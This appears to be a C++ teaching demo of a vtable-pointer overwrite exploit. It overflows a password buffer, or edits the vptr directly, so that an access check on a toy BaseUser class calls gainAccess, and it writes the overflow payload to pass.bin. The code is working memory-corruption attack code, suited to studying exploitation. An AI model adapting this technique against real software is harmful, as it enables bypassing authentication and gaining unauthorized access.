// Exploiting Vulnerability using VPtr Overwrite
// DISCLAIMER: This code is for educational purposes only.

#include "BaseUser.h"
#include "utils.h"
#include <fstream>
using namespace std;

#ifdef NO_PIE

void runWithoutPIE() {
    cout << "Running without PIE - overwrite vptr through input." << endl;
}

void bufferAccessDemo() {
    BaseUser base("John", "abc");
    char pw[4];
    BaseUser *b = &base;

    int *p = reinterpret_cast<int *>(b);
    cout << "vptr: 0x" << hex << p[0] << endl;

    char overflowBuffer[sizeof(pw) + 8];
    memset(overflowBuffer, 'A', sizeof(pw));
    int address = p[0] - 8;
    memcpy(overflowBuffer + sizeof(pw), &address, sizeof(address));

    cout << "Overflow buffer was generated: ";
    for (int i = 0; i < sizeof(overflowBuffer); i++) {
	cout << hex << static_cast<int>(overflowBuffer[i]) << " ";
    }
    cout << endl;

    unsafeCopy(pw, overflowBuffer);
    cout << "Password: [Applying overflow using unsafeCopy...]\n";

    b->checkAccess(pw);
}

void generateAndWriteOverflowToFile() {
    BaseUser base("John", "abc");
    char pw[PW_BUFFER_SIZE];
    BaseUser *b = &base;

    int *p = reinterpret_cast<int *>(b);

    // The reason we write overflow data to a file is:
    // 1. Memory addresses can include unprintable characters.
    //    Writing them to a file avoids issues with terminal-based input.
    // 2. The order of bytes in a memory address can vary based on the machine's
    //    endianness. Using a file can help maintain consistency.
    // 3. It emulates a real-world scenario where an attacker might provide
    //    overflow input through a file or other external data source.

    ofstream outfile("pass.bin", ios::out | ios::binary);
    if (outfile.is_open()) {
	for (int i = 0; i < sizeof(pw); i++) {
	    char c = 'A';
	    outfile.write(&c, sizeof(c));
	}

	// Adjust the address based on system architecture.
	int address = p[0] - MEM_ADDRESS_SIZE;
	outfile.write(reinterpret_cast<const char *>(&address),
		      sizeof(address));
	outfile.close();
	cout << "Overflow file 'pass.bin' created." << endl;
    } else {
	cout << "Unable to open file." << endl;
    }
}

void readAndDisplayOverflowFromFile() {
    ifstream infile("pass.bin", ios::in | ios::binary);
    if (infile.is_open()) {
	infile.seekg(0, ios::end);
	int length = infile.tellg();
	infile.seekg(0, ios::beg);

	char *buffer = new char[length];
	infile.read(buffer, length);

	cout << "Overflow buffer was generated: ";
	for (int i = 0; i < length; i++) {
	    cout << hex << static_cast<int>(buffer[i]) << " ";
	}
	cout << endl;

	delete[] buffer;
	infile.close();
    } else {
	cout << "Unable to open file." << endl;
    }
}

void handleFileBasedOverflow() {
    BaseUser base("John", "abc");
    char pw[PW_BUFFER_SIZE];
    BaseUser *b = &base;

    cout << "Password: [Applying overflow using unsafeGets...]" << endl;
    unsafeGets(pw);
    b->checkAccess(pw);
}

void bufferAccessGetsDemo() {
    readAndDisplayOverflowFromFile();
    handleFileBasedOverflow();
}

#else

// Code for when PIE is enabled.
void runWithPIE() {
    cout << "Running with PIE - modify vptr directly." << endl;
}

void vptrAccessDemo() {
    char name[100] = "John";
    BaseUser base(name, "abc");
    char pw[100];

    cout << "Enter password (doesn't matter for the exploit): ";
    cin >> pw;

    BaseUser *b = &base;
    int *p = reinterpret_cast<int *>(b);
    cout << "vptr: 0x" << hex << p[0] << endl;

    // modify vptr to gain unauthorized access.
    *p = (*p) - MEM_ADDRESS_SIZE;
    cout << "vptr now points to gainAccess: 0x" << hex << *p << endl;

    b->checkAccess(pw);
}

#endif

int main(int argc, char *argv[]) {
#ifdef NO_PIE
    runWithoutPIE();
    // Check if standard input is being redirected from a file
    if (!isatty(fileno(stdin))) {
	bufferAccessGetsDemo();
    } else {
	// Generate the overflow file only once.
	generateAndWriteOverflowToFile();
	bufferAccessDemo();
    }
#else
    runWithPIE();
    vptrAccessDemo();
#endif

    return 0;
}
